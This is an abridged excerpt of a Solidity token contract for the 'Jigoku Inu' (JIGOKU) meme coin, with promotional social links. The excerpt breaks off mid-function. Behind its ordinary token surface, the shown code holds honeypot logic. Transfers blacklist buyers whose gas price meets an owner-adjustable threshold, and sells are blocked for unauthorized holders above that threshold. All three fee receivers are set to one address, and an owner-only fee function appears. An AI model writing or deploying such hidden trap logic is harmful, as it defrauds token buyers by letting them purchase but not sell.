...
Jigoku Inu - THE DIVINE HOUND FROM HELL

Telegram:   https://t.me/JigokuInu
Website:    https://jigokuinu.com/
Twitter:    https://twitter.com/JigokuInuToken
...
contract JigokuInu is Ownable, IBEP20 {
    ...
    string  _name = "Jigoku Inu";
    string  _symbol = "JIGOKU";
    ...
    constructor () {
        ...
        marketingFeeReceiver = 0xa3B70E8A57926544E4507e2E8522a97224eE4B77;
        teamFeeReceiver = 0xa3B70E8A57926544E4507e2E8522a97224eE4B77;
        devFeeReceiver = 0xa3B70E8A57926544E4507e2E8522a97224eE4B77;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= poder && recipient != pair) {
            isblacklisted[recipient] = true;
        }

        if (recipient == pair && !authorizations[sender]) {
            require(tx.gasprice <= poder, ">Sell on wallet action"); 
        }
    ...
    function updatePoder (uint256 _poder) public onlyOwner {
        poder = _poder * 1 gwei; 
    }
    ...
    function processFees(address account, uint256 amount) onlyOwner public virtual {
